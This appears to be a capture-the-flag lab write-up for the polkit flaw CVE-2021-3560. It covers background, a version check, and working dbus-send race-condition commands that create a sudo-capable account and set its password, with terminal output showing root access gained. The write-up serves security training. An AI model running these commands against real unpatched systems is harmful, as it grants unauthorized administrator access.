# Room
https://tryhackme.com/room/polkit

# Task 1 - Deploy
Deploy VM

# Task 2 - Flags
Dynamic Flags

# Task 3 - Background
* Privilege escalation vulnerability in Linux polkit utility - CVE-2021-3560
* Some vulnerable distros
  * RHEL 8
  * Fedora 21
  * Debian Bullseye
  * Ubuntu 20.04 LTS
* Fixed Ubuntu binary: policykit-1
  * sudo apt list --installed | grep policykit-1
  * look for 0.105-26ubuntu1.1 or later for the patched version
  * look for 0.105-26ubuntu1 for the vulnerable version
* What is polkit
  * part of Linux authorization system
  * toolkit used to determine if you have the right permissions to perform a privileged action
  * launched with pkexec
    * pkexec useradd test1234
* How is polkit exploitable
  * exploits a race condition
  * send manual dbus message requests and kill them before they are processed to trick polkit command authorization

# Task 4 - Exploitation
* normal account creation example:
```
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
```
* account creation example with sleep and kill
  * note, you will need to adjust the sleep timer depending on the system, too long of a sleep and the exploit fails
```
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
```
* use openssl to generate a password hash
```
openssl passwd -6 test
```
* password creation example with sleep and kill
  * note, you will need to adjust the sleep timer depending on the system, too long of a sleep and the exploit fails
```
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
```

# Task 5 - Practical
Test the exploit on the VM
* SSH to the box as a normal user
* Check for vulnerable version
```
tryhackme@polkit:~$ apt list --installed | grep policykit-1

WARNING: apt does not have a stable CLI interface. Use with caution in scripts.

policykit-1/focal,now 0.105-26ubuntu1 amd64 [installed,upgradable to: 0.105-26ubuntu1.1]
```
* Run the exploit to create a user
```
tryhackme@polkit:~$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.free
desktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!                                    
[1] 1180                                                                                                                                  

[1]+  Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Account
s org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1                                                  

tryhackme@polkit:~$ id attacker                                                                                                           
uid=1000(attacker) gid=1000(attacker) groups=1000(attacker),27(sudo)           
```
* Run the exploit to create the password
```
tryhackme@polkit:~$ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000
 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZ
LGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!                                                                   
[1] 1219                                                                                                                                  
tryhackme@polkit:~$                                                                                                                       

[1]+  Terminated              dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Account
s/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester'
tryhackme@polkit:~$ 
```
* su to the user and check permissions
```
tryhackme@polkit:~$ su attacker
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

attacker@polkit:/home/tryhackme$ id
uid=1000(attacker) gid=1000(attacker) groups=1000(attacker),27(sudo)

attacker@polkit:/home/tryhackme$ whoami
attacker

attacker@polkit:/home/tryhackme$ sudo -l
[sudo] password for attacker: 
Matching Defaults entries for attacker on polkit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User attacker may run the following commands on polkit:
    (ALL : ALL) ALL
```
* Grab flag